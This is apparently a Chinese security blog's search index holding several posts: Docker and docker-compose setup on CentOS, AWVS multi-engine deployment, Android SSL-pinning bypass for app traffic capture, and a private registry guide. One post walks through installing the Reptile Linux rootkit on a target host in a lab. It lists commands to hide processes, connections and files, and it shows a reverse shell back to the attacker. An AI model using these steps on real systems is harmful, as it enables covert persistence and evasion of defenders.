<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>CentOS7 Docker和Docker-compose</title>
      <link href="/2020/01/13/CentOS7%20Docker%E5%92%8CDocker-compose/"/>
      <url>/2020/01/13/CentOS7%20Docker%E5%92%8CDocker-compose/</url>
      <content type="html"><![CDATA[<h2 id="0x01-解决依赖"><a href="#0x01-解决依赖" class="headerlink" title="## 0x01 解决依赖"></a>## 0x01 解决依赖</h2><h3 id="更新源"><a href="#更新源" class="headerlink" title="### 更新源"></a>### 更新源</h3><blockquote><p>yum update</p></blockquote><h3 id="安装依赖和驱动"><a href="#安装依赖和驱动" class="headerlink" title="### 安装依赖和驱动"></a>### 安装依赖和驱动</h3><blockquote><p>yum-util 提供yum-config-manager功能，另外两个是devicemapper驱动依赖的</p></blockquote><blockquote><p>yum install -y yum-utils device-mapper-persistent-data lvm2</p></blockquote><h3 id="设置yum源"><a href="#设置yum源" class="headerlink" title="### 设置yum源"></a>### 设置yum源</h3><blockquote><p>yum-config-manager –add-repo <a href="https://download.docker.com/linux/centos/docker-ce.repo" target="_blank" rel="noopener">https://download.docker.com/linux/centos/docker-ce.repo</a></p></blockquote><h3 id="查看docker可用版本"><a href="#查看docker可用版本" class="headerlink" title="### 查看docker可用版本"></a>### 查看docker可用版本</h3><blockquote><p>yum list docker-ce –showduplicates | sort -r</p></blockquote><h3 id="安装docker"><a href="#安装docker" class="headerlink" title="### 安装docker"></a>### 安装docker</h3><p>默认安装最新版</p><blockquote><p>yum install docker-ce</p></blockquote><h3 id="启动docker服务"><a href="#启动docker服务" class="headerlink" title="### 启动docker服务"></a>### 启动docker服务</h3><p>启动服务:</p><blockquote><p>systemctl start docker</p></blockquote><p>设置开机启动: </p><blockquote><p>systemctl enable docker</p></blockquote><h2 id="0x02-安装docker-compose"><a href="#0x02-安装docker-compose" class="headerlink" title="## 0x02 安装docker-compose"></a>## 0x02 安装docker-compose</h2><h3 id="源码安装python3-8"><a href="#源码安装python3-8" class="headerlink" title="### 源码安装python3.8"></a>### 源码安装python3.8</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//下载源码，安装依赖</span><br><span class="line">* wget https://www.python.org/ftp/python/3.8.1/Python-3.8.1.tar.xz</span><br><span class="line">* yum -y install gcc zlib-devel openssl-devel</span><br><span class="line">* tar -xJvf Python-3.8.1.tar.xz</span><br><span class="line">* yum -y install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gdbm-devel db4-devel libpcap-devel xz-devel</span><br><span class="line">* yum install zlib* -y</span><br><span class="line">* mkdir /usr/local/python3</span><br><span class="line"></span><br><span class="line">//编译安装</span><br><span class="line">* cd Python-3.8.1</span><br><span class="line">* ./configure --prefix=/usr/local/python3 --enable-optimizations --with-ssl</span><br><span class="line">* make</span><br><span class="line">* make install</span><br><span class="line"></span><br><span class="line">//创建软连接</span><br><span class="line">* ln -s /usr/local/python3/bin/python3 /usr/bin/python3</span><br><span class="line">* ln -s /usr/local/python3/bin/pip3 /usr/bin/pip3</span><br></pre></td></tr></table></figure><ul><li>安装检测</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//执行python命令检查版本</span><br><span class="line">* python3 -V</span><br><span class="line">* pip -V</span><br></pre></td></tr></table></figure><ul><li>升级pip</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* pip3 install --upgrade pip</span><br><span class="line">* pip install --upgrade setuptools</span><br></pre></td></tr></table></figure><h3 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="### 安装docker-compose"></a>### 安装docker-compose</h3><blockquote><p>pip3 install docker-compose</p></blockquote><h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="## 遇到的问题"></a>## 遇到的问题</h2><h3 id="问题1-——-关于subprocess32的报错"><a href="#问题1-——-关于subprocess32的报错" class="headerlink" title="### 问题1 —— 关于subprocess32的报错"></a>### 问题1 —— 关于subprocess32的报错</h3><h4 id="问题描述"><a href="#问题描述" class="headerlink" title="#### 问题描述"></a>#### 问题描述</h4><p>详见图片</p><p><img src="https://i.loli.net/2020/01/19/Mn16LkBtWCcO5TZ.jpg" alt="01.jpg"></p><h4 id="解决办法"><a href="#解决办法" class="headerlink" title="#### 解决办法"></a>#### 解决办法</h4><blockquote><p>yum -y install python-devel python-subprocess32 </p></blockquote><h3 id="问题2-——-关于uninstall-subprocess32的提示"><a href="#问题2-——-关于uninstall-subprocess32的提示" class="headerlink" title="### 问题2 —— 关于uninstall subprocess32的提示"></a>### 问题2 —— 关于uninstall subprocess32的提示</h3><h4 id="问题描述-1"><a href="#问题描述-1" class="headerlink" title="#### 问题描述"></a>#### 问题描述</h4><p><img src="https://i.loli.net/2020/01/19/u8zC1OLxHvYArZE.jpg" alt="02.jpg"></p><h4 id="解决办法-1"><a href="#解决办法-1" class="headerlink" title="#### 解决办法"></a>#### 解决办法</h4><p>使用pip安装docker-compose依赖python3环境，而centos7系统默认自带的Python版本是2.7.5，第一次执行pip install docker-compose失败后，安装python-subprocess32包后，系统中Python环境对应的信息记录文件并未更新，需要删除后，让系统重新自动生成。</p><blockquote><p>find / -name <em>subpro</em>.egg-info<br>/usr/lib64/python2.7/site-packages/subprocess32-3.2.6-py2.7.egg-info<br>find / -name <em>subpro</em>.egg-info |xargs rm -rf</p></blockquote><p>再次执行安装，pip install docker-compose，即可成功</p>]]></content>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Reptile Linux rootkit后门</title>
      <link href="/2019/10/22/Reptile%20Linux%20rootkit%E5%90%8E%E9%97%A8/"/>
      <url>/2019/10/22/Reptile%20Linux%20rootkit%E5%90%8E%E9%97%A8/</url>
      <content type="html"><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="## 项目地址"></a>## 项目地址</h2><p><a href="https://github.com/f0rb1dd3n/Reptile" target="_blank" rel="noopener">https://github.com/f0rb1dd3n/Reptile</a></p><h2 id="安装"><a href="#安装" class="headerlink" title="## 安装"></a>## 安装</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt-get install linux-headers-$(uname -r)</span><br><span class="line">git clone https://github.com/f0rb1dd3n/Reptile.git</span><br><span class="line">cd Reptile</span><br><span class="line">./setup.sh install</span><br></pre></td></tr></table></figure><h2 id="卸载"><a href="#卸载" class="headerlink" title="## 卸载"></a>## 卸载</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./setup.sh remove</span><br></pre></td></tr></table></figure><blockquote><p>这里来说明一下，安装和卸载都是在渗透目标机器上进行的，需要交互式 shell。下面我以 ubuntu 作为渗透测试目标 kali 作为攻击机器来演示一下如何使用。</p></blockquote><h3 id="on-vulnerable-ubuntu-192-168-5-148"><a href="#on-vulnerable-ubuntu-192-168-5-148" class="headerlink" title="### on vulnerable ubuntu(192.168.5.148)"></a>### on vulnerable ubuntu(192.168.5.148)</h3><p><img src="http://carlstar.club/images/rep/000.png" alt=""></p><p><img src="https://carlstar.club/images/rep/001.png" alt=""></p><blockquote><p>和 msf 生成木马比较类似 Reverse IP 是 kali 的 ip，Reverse Port 是 反弹到 kali 的端口，SRC port 是本地接收数据包的端口 Backdoor password 是我们后门的密码。最后提示是否删除这个项目，实战下肯定是要删除的，因为这个客户端和服务端安装都是一个 setup.sh 被发现会被卸载掉，这里我自己的机器就不删了。</p></blockquote><blockquote><p>看下 rootkit 效果，没有进程，没有连接。</p></blockquote><p><img src="http://carlstar.club/images/rep/002.png" alt=""></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">隐藏进程: /reptile/reptile_cmd hide &lt;pid&gt; </span><br><span class="line">显示进程: /reptile/reptile_cmd show &lt;pid&gt;</span><br><span class="line">隐藏udp: /reptile/reptile_cmd udp &lt;IP&gt; &lt;port&gt; hide </span><br><span class="line">显示udp: /reptile/reptile_cmd udp &lt;IP&gt; &lt;port&gt; show</span><br><span class="line">隐藏tcp: /reptile/reptile_cmd tcp &lt;IP&gt; &lt;port&gt; hide </span><br><span class="line">显示tcp: /reptile/reptile_cmd tcp &lt;IP&gt; &lt;port&gt; show</span><br><span class="line">还可以隐藏文件 所有包含 reptile 这个字符的文件会被隐藏，这个字符可以在配置文件中修改。</span><br></pre></td></tr></table></figure><h3 id="on-attacker-kali-192-168-5-149"><a href="#on-attacker-kali-192-168-5-149" class="headerlink" title="### on attacker kali(192.168.5.149)"></a>### on attacker kali(192.168.5.149)</h3><h2 id="安装控制端"><a href="#安装控制端" class="headerlink" title="## 安装控制端"></a>## 安装控制端</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./setup.sh client</span><br></pre></td></tr></table></figure><blockquote><p>安装好以后配置相关参数</p></blockquote><p><img src="http://carlstar.club/images/rep/004.png" alt=""></p><blockquote><p>这是候已经连接上了，可以看到可以上传下载和获得一个 shell</p></blockquote><p><img src="http://carlstar.club/images/rep/005.png" alt=""></p><p><img src="http://carlstar.club/images/rep/006.png" alt=""></p><p><img src="http://carlstar.club/images/rep/007.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> Linux Rootkit </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>awvs12统一面板管理多引擎Multi-engine</title>
      <link href="/2019/10/16/AWVS12%E7%BB%9F%E4%B8%80%E9%9D%A2%E6%9D%BF%E7%AE%A1%E7%90%86+%E5%A4%9A%E5%BC%95%E6%93%8EMulti-engine%20-%20Docker%E7%89%88/"/>
      <url>/2019/10/16/AWVS12%E7%BB%9F%E4%B8%80%E9%9D%A2%E6%9D%BF%E7%AE%A1%E7%90%86+%E5%A4%9A%E5%BC%95%E6%93%8EMulti-engine%20-%20Docker%E7%89%88/</url>
      <content type="html"><![CDATA[<h1 id="0x00-awvs-统一面板管理"><a href="#0x00-awvs-统一面板管理" class="headerlink" title="0x00 awvs 统一面板管理"></a>0x00 awvs 统一面板管理</h1><p><strong><a href="https://www.acunetix.com/blog/docs/install-acunetix-multi-engine/" target="_blank" rel="noopener">How to install Acunetix Multi-engine</a></strong></p><p>2017年官方网站已经更新了安装多引擎的方法，直到今天自己才折腾一番，记录一下。</p><p> 来源猪哥的链接<a href="http://t.cn/AimEyPIE" target="_blank" rel="noopener">http://t.cn/AimEyPIE</a>，版本号AWVS 12.0.190902105_x64（2019年9月2日最新版本） </p><h1 id="0x01-awvs12-Multi-engine-Docker"><a href="#0x01-awvs12-Multi-engine-Docker" class="headerlink" title="0x01 awvs12 Multi-engine Docker"></a>0x01 awvs12 Multi-engine Docker</h1><p>awvs12统一面板管理多引擎Multi-engine，一键docker部署，自动化扫描采用的方式为最新版”acunetix_12.0.190902105_x64”进行安全部署.</p><h2 id="1-部署安装"><a href="#1-部署安装" class="headerlink" title="1. 部署安装"></a>1. 部署安装</h2><ul><li>Docker-compose</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. 直接编译后运行</span><br><span class="line"></span><br><span class="line">docker-compose up -d</span><br><span class="line"></span><br><span class="line">2.先编译，后运行</span><br><span class="line"></span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/10/16/AgfQZwx4GEnrs5m.png" alt="a"></p><h2 id="2-配置Multi-engine"><a href="#2-配置Multi-engine" class="headerlink" title="2. 配置Multi-engine"></a>2. 配置Multi-engine</h2><h3 id="注册配置Agent"><a href="#注册配置Agent" class="headerlink" title="# 注册配置Agent"></a># 注册配置Agent</h3><ul><li>访问agent页面，如下</li></ul><p><img src="https://i.loli.net/2019/10/17/Zka2scHdtRu4pPO.png" alt="访问agent注册页面.png"></p><ul><li>配置management端地址</li></ul><p><img src="https://i.loli.net/2019/10/17/mbI2gtj3xsaGVAJ.png" alt="填写agent注册信息.png"></p><ul><li>发送注册请求，等待management确认</li></ul><p><img src="https://i.loli.net/2019/10/17/YN2pZ8ckIbAWE9X.png" alt="agent等待确认结果.png"></p><h3 id="配置awvs-management"><a href="#配置awvs-management" class="headerlink" title="# 配置awvs_management"></a># 配置awvs_management</h3><p><img src="https://i.loli.net/2019/10/17/VasNlHKh31TcJQu.png" alt="管理添加引擎页面.png"></p><ul><li>确认添加</li></ul><p><img src="https://i.loli.net/2019/10/17/VsjhWq4DYnl1Axg.png" alt="管理添加引擎页面authorize.png"></p><p><img src="https://i.loli.net/2019/10/17/cbo7QKvIxmAZ6ek.png" alt="添加引擎success.png"></p><p><img src="https://i.loli.net/2019/10/17/QnCKuI6AXZ7TsjW.png" alt="添加引擎.png"></p><h2 id="3-可能的问题"><a href="#3-可能的问题" class="headerlink" title="3. 可能的问题"></a>3. 可能的问题</h2><h3 id="management页面注册认证失败"><a href="#management页面注册认证失败" class="headerlink" title="# management页面注册认证失败"></a># management页面注册认证失败</h3><p>进入manage docker中，执行如下命令：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch /home/acunetix/.acunetix/data/license/wa_data.dat</span><br></pre></td></tr></table></figure><h3 id="一件配置部署"><a href="#一件配置部署" class="headerlink" title="# 一件配置部署"></a># 一件配置部署</h3><p>暂无脚本意见完成所有agent注册以及management面板的确认等问题，后续优化。</p>]]></content>
      
      
        <tags>
            
            <tag> awvs </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>逻辑让我崩溃之日常APP抓包几法</title>
      <link href="/2019/09/28/%E9%80%BB%E8%BE%91%E8%AE%A9%E6%88%91%E5%B4%A9%E6%BA%83%E4%B9%8B%E6%8A%93%E5%8C%85%E5%87%A0%E6%B3%95/"/>
      <url>/2019/09/28/%E9%80%BB%E8%BE%91%E8%AE%A9%E6%88%91%E5%B4%A9%E6%BA%83%E4%B9%8B%E6%8A%93%E5%8C%85%E5%87%A0%E6%B3%95/</url>
      <content type="html"><![CDATA[<h1 id="0x00-日常BB"><a href="#0x00-日常BB" class="headerlink" title="#0x00 日常BB"></a>#0x00 日常BB</h1><p>文章首发是在先知社区<a href="https://xz.aliyun.com/t/6558" target="_blank" rel="noopener">“逻辑让我崩溃之日常APP抓包几法”</a></p><p>还是把自己平时发现的，自认为有点意思的点罗列出来，班门弄斧，师傅们别笑话→.→</p><p>本次想分享的是关于自己遇到的一些关于app测试抓包遇到几种状况，同时也看到好多身边的小伙伴很多时候根本不会折腾这些方式，另外自己暂且还没有将技术探究到多深入，希望文中的点能让人有所可用。</p><h1 id="0x01-关于代理"><a href="#0x01-关于代理" class="headerlink" title="#0x01 关于代理"></a>#0x01 关于代理</h1><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191013153334-c33354c8-ed8b-1.png" alt="代理原理1"></p><p>首先，通过一张图我们可以看到我们日常抓包一直说的“设置代理”，“走代理”到底对于C/S或者B/S的交互来说意味着什么，扮演了什么样的角色。</p><p>接着，我们设置代理之后，通过导入证书之类的操作之后就可以抓到http、部分https的包了。我尝试用两张图来直观展示代理软件证书的作用(此处是导入burpsuite证书)，浏览器导入证书之后访问网站的情况截图，其实这中间涉及到ssl的一些点，我把参考文章放到了最后，有需要的可以看下具体的认证过程，如下图所示：</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191013153359-d220fa30-ed8b-1.png" alt="抓包原理1"></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191013153415-db85d604-ed8b-1.png" alt="抓包原理2"></p><p>那么测试过程中有一些情况是只“导证书、设代理”这些是不够的，需要在借助一些其他工具或者使用其他方式的。我们说说这些情况下我们可以做些什么突破或绕过限制：</p><h1 id="0x02-借助框架-amp-模块"><a href="#0x02-借助框架-amp-模块" class="headerlink" title="#0x02 借助框架&amp;模块"></a>#0x02 借助框架&amp;模块</h1><h2 id="1-Xposed-JustTrustMe"><a href="#1-Xposed-JustTrustMe" class="headerlink" title="1. Xposed -  JustTrustMe"></a>1. Xposed -  JustTrustMe</h2><p>如本标题所言，just trust me，我们自然要说的就是xposed的一个好用的模块<a href="https://github.com/Fuzion24/JustTrustMe" target="_blank" rel="noopener">JustTrustMe</a></p><h3 id="1-1-模块原理"><a href="#1-1-模块原理" class="headerlink" title="1.1 模块原理"></a>1.1 模块原理</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">**Point: disable**</span><br><span class="line"></span><br><span class="line">An xposed module that disables SSL certificate checking for the purposes of auditing an app with cert pinning</span><br></pre></td></tr></table></figure><h3 id="1-2-使用方法"><a href="#1-2-使用方法" class="headerlink" title="1.2 使用方法"></a>1.2 使用方法</h3><p>使用的话已经有特别多的文章介绍使用，以夜神的安卓模拟器为例，也就只需要我们做几个简单的操作：</p><ol><li>安装夜神模拟器；</li><li>安装xpose框架；</li><li>安装<a href="https://github.com/Fuzion24/JustTrustMe" target="_blank" rel="noopener">JustTrustMe</a>；</li><li>激活<a href="https://github.com/Fuzion24/JustTrustMe" target="_blank" rel="noopener">JustTrustMe</a>模块；</li><li>操作结束；</li></ol><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191013154924-f9c0668c-ed8d-1.png" alt=""></p><h3 id="1-3-案例演示"><a href="#1-3-案例演示" class="headerlink" title="1.3 案例演示"></a>1.3 案例演示</h3><p>你可以随便找一个常用APP测试即可，有很多部分App是使用此框架和模块后即可抓到包了。</p><h2 id="2-Xposed-SSLUnPinning"><a href="#2-Xposed-SSLUnPinning" class="headerlink" title="2. Xposed - SSLUnPinning"></a>2. Xposed - SSLUnPinning</h2><p>与JustTrustMe类似的，<a href="https://github.com/ac-pm/SSLUnpinning_Xposed" target="_blank" rel="noopener">SSLUnPinning</a>自然针对SSLPinning而生，他也是Xpose下的一个模块。</p><h3 id="2-1-模块原理"><a href="#2-1-模块原理" class="headerlink" title="2.1 模块原理"></a>2.1 模块原理</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">**Point: bypass**</span><br><span class="line"></span><br><span class="line">Android Xposed Module to bypass SSL certificate validation (Certificate Pinning).</span><br></pre></td></tr></table></figure><h3 id="2-2-使用方法"><a href="#2-2-使用方法" class="headerlink" title="2.2 使用方法"></a>2.2 使用方法</h3><p>在安装xposed之后</p><ol><li>安装<a href="https://github.com/ac-pm/SSLUnpinning_Xposed" target="_blank" rel="noopener">SSLUnPinning</a>；</li><li>激活<a href="https://github.com/ac-pm/SSLUnpinning_Xposed" target="_blank" rel="noopener">SSLUnPinning</a>模块；</li></ol><h3 id="2-3-案例演示"><a href="#2-3-案例演示" class="headerlink" title="2.3 案例演示"></a>2.3 案例演示</h3><p>结合上面的justtrustme模块使用，效果很好。</p><h1 id="0x02-借助代理软件"><a href="#0x02-借助代理软件" class="headerlink" title="0x02 借助代理软件"></a>0x02 借助代理软件</h1><p>这里的代理软件指的场景是结合安卓模拟器，不在模拟器本地设置代理，通过宿主机将模拟器流量全部代理到抓包软件的方式。</p><h2 id="1-用proxifier说话"><a href="#1-用proxifier说话" class="headerlink" title="1. 用proxifier说话"></a>1. 用proxifier说话</h2><h3 id="1-1-是否功能够用"><a href="#1-1-是否功能够用" class="headerlink" title="1.1 是否功能够用"></a>1.1 是否功能够用</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Proxifier是一款功能非常强大的socks5客户端，可以让不支持通过代理服务器工作的网络程序能通过HTTPS或SOCKS代理或代理链。</span><br></pre></td></tr></table></figure><h3 id="1-2-原理"><a href="#1-2-原理" class="headerlink" title="1.2 原理"></a>1.2 原理</h3><p>Proxifier可以通过设置，将进程流量定向到特定的代理，简单说就是可以全局走代理，也可以单独进行走单独代理。网上文章倒是有不少。我想要说的就是针对模拟器不能设代理的问题，将夜神的流量代理到抓包软件去。</p><h3 id="1-3-实例一下"><a href="#1-3-实例一下" class="headerlink" title="1.3 实例一下"></a>1.3 实例一下</h3><p>你应该见到过这几种提示吧？</p><p><strong>“XXX请检查是否设置代理”</strong><br><strong>“XXX已停止运行”</strong></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191013153529-0820de8e-ed8c-1.png" alt="已停止运行"></p><p>应用运行检测本地是否设置代理，并终止应用运行，说白了就是不允许本机设置代理运行。OK，fine，那就不设置代理了呗。这时候Proxifier不就正好派上用场了么。</p><h3 id="1-4-使用方法"><a href="#1-4-使用方法" class="headerlink" title="1.4 使用方法"></a>1.4 使用方法</h3><h4 id="1-4-1-Windows-夜神-Proxifier"><a href="#1-4-1-Windows-夜神-Proxifier" class="headerlink" title="1.4.1 Windows 夜神 + Proxifier"></a>1.4.1 Windows 夜神 + Proxifier</h4><ul><li>找准进程</li></ul><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191013153607-1e4b0ef0-ed8c-1.png" alt="windows夜神1"></p><ul><li>设置proxy</li></ul><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191013153644-347ce20c-ed8c-1.png" alt="windows夜神2"></p><ul><li>设置rules</li></ul><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191013153700-3ddc7466-ed8c-1.png" alt="windows夜神3"></p><ul><li>验证结果</li></ul><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191013153721-4ab06ac6-ed8c-1.png" alt="windows夜神4"></p><h4 id="1-4-2-mac-夜神-Genymotion-Proxifier"><a href="#1-4-2-mac-夜神-Genymotion-Proxifier" class="headerlink" title="1.4.2 mac 夜神/Genymotion + Proxifier"></a>1.4.2 mac 夜神/Genymotion + Proxifier</h4><p>试了一下，Mac下不管是夜神还是Genymotion都是同一个进程。</p><ul><li>找准进程</li></ul><p><strong>找了半天，中间像下面的图中看到的，一直设置进程为“Nox Player”，其实mac下的进程添加的时候应该是VBoxHeadless</strong></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191013153824-70540418-ed8c-1.png" alt="Mac夜神1"></p><ul><li>设置proxy</li></ul><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191013153808-66b8bdc2-ed8c-1.png" alt="Mac夜神2"></p><ul><li>设置rules</li></ul><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191013154814-cfce6d9c-ed8d-1.png" alt="Mac夜神3"></p><ul><li>验证结果</li></ul><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191013153906-8926c282-ed8c-1.png" alt="Mac夜神4"></p><h1 id="0x03-借助“虚拟机”"><a href="#0x03-借助“虚拟机”" class="headerlink" title="0x03 借助“虚拟机”"></a>0x03 借助“虚拟机”</h1><p>那，如果应用App运行时不允许在模拟器运行，直接终止运行咋个办，那你可以试试虚拟机了，也就是<a href="https://github.com/android-hacker/VirtualXposed" target="_blank" rel="noopener">VirtualXposed</a></p><h3 id="1-1-功能是否够用"><a href="#1-1-功能是否够用" class="headerlink" title="1.1 功能是否够用"></a>1.1 功能是否够用</h3><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191013155134-474ac2a8-ed8e-1.png" alt="virtualxposed1"></p><p>VirtualXposed一开始应该是为了让像我一样的不想刷Xpose、获取root一顿操作的懒人设计的，像图中看到的克隆应用等功能，或者是真实物理机双开应用。模拟了一个虚拟环境，其中还运行着Xpose，还有自己可以安装其他模块。</p><p>对于测试而言，正好应用于众多应用App模拟器不允许运行的状况，VirtualXposed内运行应用，手机设置代理，避免了模拟器运行的检测，同时可以设置代理进行抓包测试。</p><h3 id="1-2-使用方法-1"><a href="#1-2-使用方法-1" class="headerlink" title="1.2 使用方法"></a>1.2 使用方法</h3><p>傻瓜式操作，所有功能大概一看就知道了。</p><h3 id="1-3-几点注意"><a href="#1-3-几点注意" class="headerlink" title="1.3 几点注意"></a>1.3 几点注意</h3><ul><li>同一版本VirtualXposed，不同Android版本运行会直接影响是否可以抓到包</li></ul><blockquote><p>某次测试中，Android6以上机子使用VirtualXposed抓不到包，我Android6的红米note3可以</p></blockquote><ul><li>同一Android，不同版本VirtualXposed影响一些Xpose module是否可以运行(不排除是因为我的Android6版本低了)</li></ul><blockquote><p>某次测试中，装了高版本的VirtualXposed导致Xpose module运行出现bug，无法脱掉App的壳儿，换了低版本的VirtualXposed可以。</p></blockquote><ul><li>不用Android版本、不同版本VirtualXposed、不同xpose module开发时间，将这三者不同的方式组合可能会因为兼容性等问题导致运行不畅、不能抓包的问题，得折腾折腾</li></ul><h1 id="0x04-扩展一点"><a href="#0x04-扩展一点" class="headerlink" title="0x04 扩展一点"></a>0x04 扩展一点</h1><h2 id="1-1-边抓包测试边被动扫描"><a href="#1-1-边抓包测试边被动扫描" class="headerlink" title="1.1 边抓包测试边被动扫描"></a>1.1 边抓包测试边被动扫描</h2><p>这么长时间，被动扫描这么好的方式，可以结合在我们的抓包过程，</p><ul><li><p>配合burpsuite插件passive-scan-client，将流量也全部抓发到chaitin的xray或者其他被动扫描服务</p></li><li><p>将Proxifier代理出的流量直接全部代理到xray进行扫描，毕竟Proxifier相当好用</p></li></ul><h2 id="1-2-burp插件和xray"><a href="#1-2-burp插件和xray" class="headerlink" title="1.2 burp插件和xray"></a>1.2 burp插件和xray</h2><ul><li><a href="https://github.com/c0ny1/passive-scan-client.git" target="_blank" rel="noopener">burpsuite 插件passive-scan-client</a></li><li><a href="https://github.com/chaitin/xray" target="_blank" rel="noopener">chaitin x-ray</a></li></ul><h1 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h1><ul><li><a href="http://www.h3c.com/cn/d_200812/622834_30003_0.htm#_Toc212542722" target="_blank" rel="noopener">SSL技术白皮书</a></li><li><a href="https://www.jianshu.com/p/c03f47e7b9de" target="_blank" rel="noopener">HTTPS与SSL</a></li></ul>]]></content>
      
      
        <tags>
            
            <tag> 抓包技巧 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Doker搭建私有镜像库</title>
      <link href="/2019/08/19/Docker%E7%A7%81%E6%9C%89%E4%BB%93%E5%BA%93/"/>
      <url>/2019/08/19/Docker%E7%A7%81%E6%9C%89%E4%BB%93%E5%BA%93/</url>
      <content type="html"><![CDATA[<h2 id="0x01-Doker私有镜像库服务端"><a href="#0x01-Doker私有镜像库服务端" class="headerlink" title="0x01 Doker私有镜像库服务端"></a>0x01 Doker私有镜像库服务端</h2><h3 id="1-1-拉取registry"><a href="#1-1-拉取registry" class="headerlink" title="1.1 拉取registry"></a>1.1 拉取registry</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull registry</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/01/20/Uxl384tzr7uVvhq.jpg" alt="拉取registy.jpg"></p><h3 id="1-2-创建容器"><a href="#1-2-创建容器" class="headerlink" title="1.2 创建容器"></a>1.2 创建容器</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">命令示例:</span><br><span class="line"></span><br><span class="line">docker run -itd -v /data/registry:/var/lib/registry -p 5000:5000 --restart=always --name registry registry:latest</span><br></pre></td></tr></table></figure><p>注：<strong>–restart=always: 这个参数表示如果容器异常退出，则会自动重启</strong></p><p><img src="https://i.loli.net/2020/01/20/MReBFLdnSuhmKAH.jpg" alt="运行registy容器.jpg"></p><h3 id="1-3-测试Dokcer镜像仓库"><a href="#1-3-测试Dokcer镜像仓库" class="headerlink" title="1.3 测试Dokcer镜像仓库"></a>1.3 测试Dokcer镜像仓库</h3><p>本地访问:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://127.0.0.1:5000/v2/_catalog</span><br></pre></td></tr></table></figure><p>远程访问地址</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://服务器IP</span><br></pre></td></tr></table></figure><h2 id="0x02-测试镜像仓库"><a href="#0x02-测试镜像仓库" class="headerlink" title="0x02 测试镜像仓库"></a>0x02 测试镜像仓库</h2><h2 id="2-1-修改镜像源"><a href="#2-1-修改镜像源" class="headerlink" title="2.1 修改镜像源"></a>2.1 修改镜像源</h2><h3 id="2-1-1-修改下镜像源"><a href="#2-1-1-修改下镜像源" class="headerlink" title="2.1.1 修改下镜像源"></a>2.1.1 修改下镜像源</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim 